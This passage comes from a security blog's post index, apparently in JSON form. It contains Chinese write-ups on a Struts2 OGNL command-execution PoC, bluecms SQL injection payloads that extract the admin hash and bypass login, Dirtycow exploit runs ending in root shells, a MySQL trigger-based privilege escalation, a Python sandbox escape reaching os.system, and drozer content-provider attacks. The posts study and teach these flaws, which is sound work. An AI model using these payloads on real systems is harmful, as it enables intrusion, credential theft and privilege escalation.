这个漏洞和之前S2-032/033是一个地方，都是在DefaultActionInvocation.java的invokeAction方法中没有对于methodName参数内容进行校验，便直接丢到了getValue方法里面，从而造成Ongl表达式的注入。 上文引用nsfocus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html)的描述 构造PoC获取web根目录1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#req=#context.get(#parameters.a[0]),#resp=#context.get(#parameters.b[0]),#resp.setCharacterEncoding(#parameters.c[0]),#ot=#resp.getWriter (),#ot.print(#parameters.e[0]+#req.getSession().getServletContext().getRealPath(#parameters.d[0])),#ot.flush(),#ot.close):xx.toString.json?&amp;a=com.opensymphony.xwork2.dispatcher.HttpServletRequest&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=UTF-8&amp;d=/&amp;e=webpath: 执行系统命令1/(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#a=(new java.lang.ProcessBuilder(#parameters.a[0])).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(#parameters.b[0]),#matt.getWriter().println(#parameters.c[0]+new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()):xx.toString.json?&amp;a=whoami&amp;b=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;c=flag: 总结Struts2命令执行算是一个比较经典的漏洞了，希望以后深入java的一些框架，可以从底层来分析：）"},{"title":"【Code Review】bluecms v1.6 Sql Injection 分析","permalink":"http://blog.0kami.cn/2017/01/11/old-old-bluecms-v1-6-Sql-Injection/","text":"概述很久没有代码审计了，拿一套简单的找找感觉。bluecms是一套比较老的门户网站cms，网上也有很多关于它的漏洞还未修补，所以下文的漏洞也不算是最新的，仅当是练练手。 SQL注入分析首先关注一下数据的输入 全局数据转义在common.inc.php中 1234567if(!get_magic_quotes_gpc())&#123; $_POST = deep_addslashes($_POST); $_GET = deep_addslashes($_GET); $_COOKIES = deep_addslashes($_COOKIES); $_REQUEST = deep_addslashes($_REQUEST);&#125; 再跟进一下deep_addslashes 123456789101112131415function deep_addslashes($str)&#123; if(is_array($str)) &#123; foreach($str as $key=&gt;$val) &#123; $str[$key] = deep_addslashes($val); &#125; &#125; else &#123; $str = addslashes($str); &#125; return $str;&#125; 可以发现对数据的注入，进行了加斜杠转义的操作。那么接下来找注入思路主要有以下3点： 找整数型注入 整套cms默认gb2312编码，容易造成宽字节注入 http头并不在转义的范围内，所以类似存入ip，reffer的位置也能发生注入 整数型注入拿grep匹配了一下$_GET，找到一处不做其他过滤的整数型位置 1./ad_js.php:$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;; 跟进ad_js.php 12345678$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;if(empty($ad_id))&#123; echo &apos;Error!&apos;; exit();&#125;$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id); getone函数 12345function getone($sql, $type=MYSQL_ASSOC)&#123; $query = $this-&gt;query($sql,$this-&gt;linkid); $row = mysql_fetch_array($query, $type); return $row;&#125; 可以看到这里对ad_id没有做其他过滤处理，造成了整数型注入,由于后面会将ad_content打印在页面上，所以直接用union注入就可以获得数据，构造payload 1/ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,concat(admin_name,0x23,pwd)%20from%20blue_admin%20limit%201 结果可以在返回的界面中看到 123&lt;!--document.write(&quot;admin#21232f297a57a5a743894a0e4a801fc3&quot;);--&gt; ps:因为该cms错误回显具体sql语句，表前缀可以通过报错的方法把表前缀爆出来。 宽字节注入bluecms操作数据库的具体类定义在mysql.class.php,默认连接时的编码为gbk，我们可以知道当数据库连接时的编码为gbk等双字节编码时，容易发生宽字节注入。前面提到该套cms对数据输入进行了转义的操作，那么刚刚好条件都齐了，必然存在宽字节注入。grep看了一下，基本上的字符串都只是做了转义处理，所以字符串数据输入点都存在宽字节注入。大多数注入都是盲注，没找到具体可以会显数据的地方，这里就简单看一下登陆处 后台登录处其实前台user.php，也存在注入，只是盲注，这里就取简单的后台登录验证处admin/login.php 12345678910111213141516171819202122elseif($act == &apos;do_login&apos;)&#123; $admin_name = isset($_POST[&apos;admin_name&apos;]) ? trim($_POST[&apos;admin_name&apos;]) : &apos;&apos;; $admin_pwd = isset($_POST[&apos;admin_pwd&apos;]) ? trim($_POST[&apos;admin_pwd&apos;]) : &apos;&apos;; $remember = isset($_POST) ? intval($_POST[&apos;rememberme&apos;]) : 0; if($admin_name == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if($admin_pwd == &apos;&apos;)&#123; showmsg(&apos;xxx&apos;); &#125; if(check_admin($admin_name, $admin_pwd))&#123; update_admin_info($admin_name); if($remember == 1)&#123; setcookie(&apos;Blue[admin_id]&apos;, $_SESSION[&apos;admin_id&apos;], time()+86400); setcookie(&apos;Blue[admin_name]&apos;, $admin_name, time()+86400); setcookie(&apos;Blue[admin_pwd]&apos;, md5(md5($admin_pwd).$_CFG[&apos;cookie_hash&apos;]), time()+86400); &#125; &#125;else&#123; showmsg(&apos;xxx&apos;); &#125; showmsg(&apos;xxx&apos;, &apos;index.php&apos;); &#125; 继续跟进check_admin 12345678910111213function check_admin($name, $pwd)&#123; global $db; $row = $db-&gt;getone(&quot;SELECT COUNT(*) AS num FROM &quot;.table(&apos;admin&apos;).&quot; WHERE admin_name=&apos;$name&apos; and pwd = md5(&apos;$pwd&apos;)&quot;); if($row[&apos;num&apos;] &gt; 0) &#123; return true; &#125; else &#123; return false; &#125;&#125; 可以看到这里发生了一次登陆验证，可以通过宽字节注入来做万能密码登陆。 1user_name=admin%65%27+or+1%3D1%23&amp;pwd=123 存入ip造成注入在common.inc.php中可以找到getip()函数 12345678910111213141516171819202122232425262728function getip()&#123; if (getenv(&apos;HTTP_CLIENT_IP&apos;)) &#123; $ip = getenv(&apos;HTTP_CLIENT_IP&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_X_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_X_FORWARDED&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;); &#125; elseif (getenv(&apos;HTTP_FORWARDED&apos;)) &#123; $ip = getenv(&apos;HTTP_FORWARDED&apos;); &#125; else &#123; $ip = $_SERVER[&apos;REMOTE_ADDR&apos;]; &#125; return $ip;&#125; 再看看调用他的位置 online_ip调用处 看看guest_book.php处存在insert注入，并且可以通过覆盖后面的content，造成数据回显。通过xff传入注入语句或者client ip传入。 结果可以看到 其他位置的注入，不能回显，就不分析了。 总结总体来说，直接可以grep到$_GET、$_POST、$_REQUEST的cms，审计起来会比较轻松。可以先从入口看起，将common,config等文件看一遍，再查找危险函数，数据入口就可审计出几个漏洞来。bluecms暂时审计到这一步，主要找的是SQL注入的漏洞。其他漏洞打算准备另外一套cms来审计:)"},{"title":"【VULNERABLITY】文件包含漏洞详解","permalink":"http://blog.0kami.cn/2016/12/19/old-old-file-include/","text":"概述很久没有归纳总结知识点了，学了那么多总感觉那么零散，所以准备开始总结这一系列的漏洞详解。一方面是总结一方面也是复习。这篇主要总结一下文件包含漏洞。 文件包含漏洞由于在Web应用开发的过程中，大量代码是可以重复使用的，为了方便使用结合开发语言(如php)的便利，包含重复利用的代码，如果在包含过程中，路径或请求的url可控且没有做任何的安全处理，就容易发生文件包含漏洞。文件包含漏洞包括 本地文件包含 远程文件包含 下面主要讲的文件包含在php中的应用，毕竟php是世界上最好的语言，23333333ps:其他语言，遇到了再补充 远程文件包含这里先讲一下远程文件包含RFI（Remote File Include），顾名思义，远程文件包含就是，Web应用程序请求远程的资源，进行一个包含利用。一些猥琐的过马一句话木马就是利用这种方式进行一个恶意代码的包含。在php中造成远程文件包含，首先需要配置文件中allow_url_include=On默认不开启，以及远程读取文件allow_url_fopen=On，满足这些条件，我们再来看看有哪些触发远程文件包含的php函数。12345678910//读取远程文件内容fopen()copy()file_get_content()//包含远程文件代码include()include_once()require()require_once()//可能会有遗漏，小伙伴如果知道还有其他的可以email我：） 前面读取远程文件内容，可能会出现在上传头像处，存取远程头像。后者危害可能更大，直接包含恶意代码执行导致任意代码执行。 远程包含支持的协议在满足配置文件的要求下，使用php支持使用http、https(存在openssl扩展时)、ftp、php://input、"},{"title":"【CVE-2016-5195】Dirtycow","permalink":"http://blog.0kami.cn/2016/10/26/old-old-dirtycow-cve-2016-5195/","text":"概述最近出来的dirtycow，影响版本:Linux kernel &gt;= 2.6.22（2007年发行，到今年10月18日才修复）,用网上的EXP试了一下，记录一下过程 EXPhttps://www.exploit-db.com/exploits/40616/这个EXP是exploitdb上的，但是容易造成系统崩溃，成功后会返回一个root权限的shell 123456789101112131415okami@ubuntu14:~$ ./dirtycowDirtyCow root privilege escalationBacking up /usr/bin/passwd.. to /tmp/bakSize of binary: 47032Racing, this may take a while..thread stoppedthread stopped/usr/bin/passwd is overwrittenPopping root shell.Don&apos;t forget to restore /tmp/bakroot@ubuntu14:/home/okami# iduid=0(root) gid=1000(okami) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),114(lpadmin),115(sambashare),1000(okami)root@ubuntu14:/home/okami# whoamirootroot@ubuntu14:/home/okami# https://github.com/scumjr/dirtycow-vdso这个EXP不会出现系统崩溃，但是作者本人说不适用于所有linux版本，不过试验了一下，ubuntu14 16 centOS7都可以123456789101112131415161718192021okami@ubuntu14:~$ ./0xdeadbeef[*] exploit: patch 1/2[*] vdso successfully backdoored[*] exploit: patch 2/2[*] vdso successfully backdoored[*] waiting for reverse connect shell...[*] enjoy![*] restore: patch 2/2[*] vdso successfully restored[*] restore: patch 1/2[*] vdso successfully restorediduid=0(root) gid=0(root) groups=0(root)whoamirootlsb_release -aNo LSB modules are available.Distributor ID: UbuntuDescription: Ubuntu 14.04.5 LTSRelease: 14.04Codename: trusty 注意这里有一步是waiting for reverse connect shell…，需要一点时间，成功后有root权限的shell"},{"title":"【CVE-2016-6662】MYSQL提权分析","permalink":"http://blog.0kami.cn/2016/09/18/old-old-cve-2016-6663-mysql-exp/","text":"概述几天前出了mysql本地提权的0day，虽然现在官方已经出了补丁，但是受影响的主机还是挺多的。跟进操作一遍：） 漏洞影响1234567MySQL &lt;= 5.7.15 远程代码执行/ 提权 (0day) 5.6.33 5.5.52Mysql分支的版本也受影响,包括： MariaDB PerconaDB 实验分析这次实验主要使用docker搭建环境，有需要的同学可以pull我的库玩0kami/vulenv:cve-2016-6663实验主要从attacker的角度入手，预先拥有的权限：1234mysql 账户拥有file权限 bob/bobexp mysql_hookandroot_lib.cmysql-server-5.6my.cnf可被mysql组改写写 先查看一下版本信息将/etc/mysql/my.cnf权限修改掉创建bob用户，并赋予file，select，insert权限，创建用于实验的数据库activedb和表active_table将exp先写入tmp目录，并编译成so文件，需要修改一下ip，port和my.cnf的位置gcc -Wall -fPIC -shared -o mysql_hookandroot_lib.c.so mysql_hookandroot_lib.c.c -ldl最后一步就是准备一下active_table的触发器了，我们可以现在自己电脑上root用户权限下生成一个tragger在activedb数据下会生成一个触发器到此位置我们所有的准备工作都做好了。让我们用bob用户来弹个shell吧1select &quot;TYPE=TRIGGERS\\ntriggers=&apos;CREATE DEFINER=`root`@`localhost` TRIGGER active_table\\nAFTER INSERT\\n ON `active_table` FOR EACH ROW\\nBEGIN\\n DECLARE void varchar(550);\\n set global general_log_file=\\\\\\&apos;/etc/mysql/my.cnf\\\\\\&apos;;\\n set global general_log = on;\\n select \\&quot;\\n[mysqld]\\nmalloc_lib=\\\\\\&apos;/tmp/mysql_hookandroot_lib.so\\\\\\&apos;\\n\\&quot; INTO void; \\n set global general_log = off;\\nEND&apos;\\nsql_modes=1073741824\\ndefiners=&apos;root@localhost&apos;\\nclient_cs_names=&apos;latin1&apos;\\nconnection_cl_names=&apos;latin1_swedish_ci&apos;\\ndb_cl_names=&apos;latin1_swedish_ci&apos;&quot; into dumpfile &apos;/var/lib/mysql/activedb/active_table.TRG&apos;; 用bob的用户写入文件产生一个触发器，这个触发器当产生insert时触发来查看一下，执行后的/etc/mysql/my.cnf的内容重启一下数据库，反弹一个shell发现可写的my.cnf会被忽略？？？不知道为什么（难道打补丁了？），不知道5.5的情况会怎么样，所以先把my.cnf的权限改回来744成功反弹一个shell，这边返回的一个shell是mysql权限的 是因为我测试的环境mysqld_safe是以mysql权限运行的，所以弹出来的权限是mysql的，但是如果mysqld_safe是以root权限运行，那么反弹的shell就是root权限的，造成提权。 总结测试环境搭建还有利用过程还是出现了很多问题，可写的my.cnf会被忽略载入（不知道是不是因为修复过的原因），triggers的利用（可以同样利用在拥有file权限的情况下提升权限，这个到时候再深入学习一下）"},{"title":"【VULNERABLITY】python sandbox escape","permalink":"http://blog.0kami.cn/2016/09/16/old-old-python-sandbox-escape/","text":"概述前几天的华山杯出了一道python的沙盒逃逸，感觉挺有意思的。在网上搜索了一下，发现很早就出过这种类型的题，源码都差不多。学习了一下思路，这里总结一下：） 介绍沙盒源码如下：123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env pythonfrom __future__ import print_functionprint(\"Welcome to my Python sandbox! Enter commands below!\")banned = [ \"import\", \"exec\", \"eval\", \"pickle\", \"os\", \"subprocess\", \"kevin sucks\", \"input\", \"banned\", \"cry sum more\", \"sys\"]targets = __builtins__.__dict__.keys() targets.remove('raw_input') targets.remove('print') for x in targets:# 去除所有内置函数除print raw_input del __builtins__.__dict__[x]while 1: print(\"&gt;&gt;&gt;\", end=' ') data = raw_input() for no in banned: if no.lower() in data.lower(): print(\"No bueno\") break else: # this means nobreak exec data 不能出现banned列表中的字符，但是需要读取flag文件内容。 原理绕过前面的限制，我们来一步一步看payload 方法一123456&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; &#123;&#125;.__class__&lt;type &apos;dict&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; 首先python的内置对象有一个class属性来存储类型，我们往上找他的父类使用base属性123456&gt;&gt;&gt; &#123;&#125;.__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt; 可以看到返回object对象，因为python中一切均为对象，均继承object对象，得到object之后我们就可在通过属性subclasses来查看object的子类（包括所有的内置类）12&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;] 回到我们的主要目的上，我们需要读取flag文件中的内容，在这些子类中有哪些是可以用来读取文件内容的呢？答案是file子类，首先查找一下file子类的位置。12&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(file)40 这样我们就可以通过这个来建立一个file类的别名读文件啦：）12&gt;&gt;&gt; f=[].__class__.__base__.__subclasses__()[40]&gt;&gt;&gt; f(&apos;./flag.txt&apos;).read() ？？？没有任何内容打印出来，但是他没有报错说明存在flag.txt文件，我们尝试用他给的print函数来打印12&gt;&gt;&gt; print(f(&apos;./flag.txt&apos;).read())This is a Flag&#123;enjoy_yourself_ctfer&#125; 得到flag 方法二同样的还有一种方法就是使用os模块来执行系统命令system，但是os被屏蔽12&gt;&gt;&gt; import osNo bueno 我们得想其他办法来获取shell。通过上面的思路，我们需要找一个子类他能调用os模块，这里用到了warnings.catch_warnings类1234567&gt;&gt;&gt; import warnings&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)59&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59]&lt;class &apos;warnings.catch_warnings&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()[&apos;filterwarnings&apos;, &apos;once_registry&apos;, &apos;WarningMessage&apos;, &apos;_show_warning&apos;, &apos;filters&apos;, &apos;_setoption&apos;, &apos;showwarning&apos;, &apos;__all__&apos;, &apos;onceregistry&apos;, &apos;__package__&apos;, &apos;simplefilter&apos;, &apos;default_action&apos;, &apos;_getcategory&apos;, &apos;__builtins__&apos;, &apos;catch_warnings&apos;, &apos;__file__&apos;, &apos;warnpy3k&apos;, &apos;sys&apos;, &apos;__name__&apos;, &apos;warn_explicit&apos;, &apos;types&apos;, &apos;warn&apos;, &apos;_processoptions&apos;, &apos;defaultaction&apos;, &apos;__doc__&apos;, &apos;linecache&apos;, &apos;_OptionError&apos;, &apos;resetwarnings&apos;, &apos;formatwarning&apos;, &apos;_getaction&apos;] 接下来再找linecache1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys().index(&apos;linecache&apos;)25&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.keys()[&apos;updatecache&apos;, &apos;clearcache&apos;, &apos;__all__&apos;, &apos;__builtins__&apos;, &apos;__file__&apos;, &apos;cache&apos;, &apos;checkcache&apos;, &apos;getline&apos;, &apos;__package__&apos;, &apos;sys&apos;, &apos;getlines&apos;, &apos;__name__&apos;, &apos;os&apos;, &apos;__doc__&apos;] 可以看到这里可以调用os模块，接下来就调用system函数了1234&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)144 整理一下123456789101112&gt;&gt;&gt; a=[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12]&gt;&gt;&gt; a&lt;module &apos;os&apos; from &apos;/usr/lib/python2.7/os.pyc&apos;&gt;&gt;&gt;&gt; s=a.__dict__.keys().index(&apos;system&apos;)&gt;&gt;&gt; s144&gt;&gt;&gt; s=a.__dict__.keys()[144]&gt;&gt;&gt; s&apos;system&apos;&gt;&gt;&gt; s=a.__dict__.values()[144]&gt;&gt;&gt; s(&apos;pwd&apos;)/home/xxxx/Desktop/code/python-code/test 好了现在可以执行系统命令了，cat一下flag12&gt;&gt;&gt; s(&apos;cat flag.txt&apos;)This is a Flag&#123;enjoy_yourself_ctfer&#125; 总结通过上面的python沙盒逃逸，发现读python官网手册还是很有必要的，找个时间一点一点看：）共勉 参考https://hexplo.it/escaping-the-csawctf-python-sandbox/"},{"title":"【MOBILE】how to install drozer on mac","permalink":"http://blog.0kami.cn/2016/08/20/old-old-how-to-install-drozer-on-mac/","text":"一：概述drozer是一款针对Android系统的安全测试框架。drozer可以帮助Android app和设备变得更安全，其提供了很多Android平台下的渗透测试exploit供你使用和分享。对于远程的exploit，它可以生成shellcode帮助你进行远程设备管理。 更快的Android安全评估drozer可以大大缩减Android安全评估的耗时，通过攻击测试暴露Android APP的漏洞。 基于真机的测试drozer运行在Android模拟器和真实设备上，它只需要USB调试即可使用。 自动化和扩展drozer有很多扩展模块，你可以找到他们进行测试以发现Android安全问题。 二：安装drozer下载链接：https://github.com/mwrlabs/drozer window和Linux下的安装要简单的多，但是在mac上安装时遇到了一些错误，因此将自己的安装步骤记录下来。 因为是用python写的，所以Mac可以下载python.egg文件进行安装。但是想通过easy_install安装，必须拥有以下这些模块： 123456789101112cffi==1.1.2cryptography==0.9.3drozer==2.3.4enum34==1.0.4idna==2.0ipaddress==1.0.14protobuf==2.4.1pyasn1==0.1.8pycparser==2.14pyOpenSSL==0.13six==1.9.0Twisted==10.2.0 而安装过程中主要的错误是由pyOpenSSL造成的。 1.1 安装openssl12$ brew uninstall openssl #if installed already$ brew install openssl 1.2 编译pyOpenSSL不幸的是在后面安装Python.egg还是会报错,原因是Drozer需要特殊版本的openssl，我们需要下载 pyOpenSSL v0.13，然后用sed指令修复typo，具体指令：1234$ wget https://pypi.python.org/packages/source/p/pyOpenSSL/pyOpenSSL-0.13.tar.gz$ tar xzvf pyOpenSSL-0.13.tar.gz$ cd pyOpenSSL-0.13$ sed -i &apos;&apos; &apos;s/X509_REVOKED_dup/X509_REVOKED_dupe/&apos; OpenSSL/crypto/crl.c 接下来我们build OpenSSL，这里需要指明本机中OpenSSL headers文件的位置：123$ python setup.py build_ext -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include$ python setup.py build$ python setup.py install 1.3 安装其他支撑文件终于进入安装说明文档中的步骤了12$ sudo easy_install --allow-hosts pypi.python.org protobuf==2.4.1$ sudo easy_install twisted==10.2.0 #ignore any warnings/errors, it works 1.4 安装drozer最后一步，install drozer1$ sudo easy_install ./drozer-2.3.4-py2.7.egg 1.5 runnning此时可以在任何目录下使用drozer 命令啦！ 三：Drozer入门— 获取App Package信息此处以sieve.apk为例 drozer每个模块的作用： 获取App包信息的模块是 ** app.package.* : 2.1 获取获取Android设备上的所有的安装的App的包名命令是：1run app.package.info -a com.mwr.example.sieve run app.package.list 这条命令会把所有的App都列出来，如果想具体查找某个App可加上-f [App关键字]的参数，如查找sieve在Android设备中的包名：1run app.package.list -f sieve 2.2 获取Sieve的一些基本信息1run app.package.info -a com.mwr.example.sieve 2.3 Itentify The Attack Surface(确定攻击面)这个测试教程主要关注的是Android 固有的IPC通信机制的脆弱性，这些特点导致了App泄漏敏感信息给同一台设备上的其它App。 查找可以进行Attack Surface的组件的命令：1run app.package.attacksurface com.mwr.example.sieve 结果显示了潜在可以利用的组件个数： “exported”表示组件可以被其他App使用。 services is debuggable表示我们可以用adb绑定一个调试器到进程。 2.4 进一步获取Attack Surface的信息如进一步获取ativity组建的attack surface信息的命令是：1run app.activity.info -a com.mwr.example.sieve 2.5 启动Activities上图的PWList和FileSelectActivity是exported并且不需要任何权限，我们可以用drozer启动他们，比如感觉PWList这个含金量应该大一点，所以就启动它了，命令是：1run app.activity.start –component com.mwr.example.sieve com.mwr.example.sieve.PWList 2.6 从Content Provider中获取信息接上2.3节，进一步获取content provider的attact surface的信息的命令是：1run app.provider.info -a com.mwr.example.sieve 从上图可以看到2.3节中两个exported的content provider的具体信息，包括名字，权限，访问路径等。 2.6.1 查找可以访问Content Provider的URI（数据泄漏）从上节图中我们猜测DBContentProvider会有某种格式的数据库，但是我们不知道其中的数据是如何组织的。Content URI必须是 “content:///” 的形式,因此我们可以构造部分的content URIs来访问DBcontent Provider。 上图存在一个需要READ_KEYS和WRITE_KEYS权限才能读和写的“/Keys”的路径。drozer的scanner模块提供了一些方法去猜测可能存在的content URIs：1run scanner.provider.finduris -a com.mwr.example.sieve 上图中检测出了可以访问content的URI，接下来我们可以用drozer的其他模块和URI从content中获取，甚至更改信息。 如：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –vertical 如上图我们获取了用户名，邮箱帐号，和Base64编码的密码字符串。 2.6.2 进行SQL注入Android操作系统建议使用SQLite数据库存储用户数据。SQLite数据库使用SQL语句，所以可以进行SQL注入。 使用projection参数和seleciton参数可以传递一些简单的SQL注入语句到Content provider。如：123run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “‘”run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –selection “‘” 上面两条命令执行后Android设备返回了非常详细的错误信息。使用Sql注入列出数据库中的所有数据表：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM SQLITE_MASTER WHERE type=’table’;–“ 使用SQL注入列出数据表的内容：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“ 使用SQL注入列出数据表的内容：1run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ –projection “* FROM Key;–“ 2.6.3 从File System-Backed Content Providers获取信息File System-backed Content Provider提供了访问底层文件系统的方法，Android沙盒会阻止App共享文件允许，而File System-backed Content Provider允许App共享文件。 对于sieve来说，我们可以推测出的FileBackupProvider就是一个file system-backed content provider。 我们可以使用drozer的app.provider.read模块查看某个文件：1run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts 可以使用app.provider.download下载文件1run app.provider.download content://com.mwr.example.sieve.FileBackupProvider/data/data/com.mwr.example.sieve/databases/database.db /home/user/database.db 2.6.4 检查Content Provider的脆弱性检查是否有SQL注入：1run scanner.provider.injection -a com.mwr.example.sieve 检查是否存在遍历文件的漏洞1run scanner.provider.traversal -a com.mwr.example.sieve 总结体会：我觉得在刚开始获取了软件包的基本信息后，就先用模块scanner里面的工具扫一扫，找到一些漏洞或者利用点后再进行下一步。 2.7 和Services交互获取是exported状态的services的命令：1run app.service.info -a com.mwr.example.sieve 关于Services的模块：如向某个服务发送信息：1run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService –msg 1 5 3 2.8 其他常用模块 shell.start 在Android设备上开启一个交互式Linux Shell tools.file.upload / tools.file.downloa tools.setup.busybox / tools.setup.minimalsu 安 装busybox或者minimalsu到Android设备上 参考链接：https://blog.ropnop.com/installing-drozer-on-os-x-el-capitan/http://www.droidsec.cn/%E4%BD%BF%E7%94%A8drozer%E5%AF%B9android%E5%BA%94%E7%94%A8%E8%BF%9B%E8%A1%8C%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0/"},{"title":"【Code Analysis】wordpress SSRF <4.5","permalink":"http://blog.0kami.cn/2016/08/19/old-old-wordpress-ssrf-4-4-2/","text":"概述前几天，wordpress爆出一个SSRF的漏洞，跟进一下，查阅了一下，网上并没有详细的利用方式。以前也没怎么接触过wordpress，看了一下受影响的代码，记录一下过程。 ip地址的几种表示方式ip地址域名有多种表示方式，浏览器都能识别出来。 常见的ip地址域名表示方法 点分十进制表示法，例如192.168.1.2 二进制表示法例如11000000101010000000000100000010，表示192.168.1.2 非常见ip地址域名表示方法 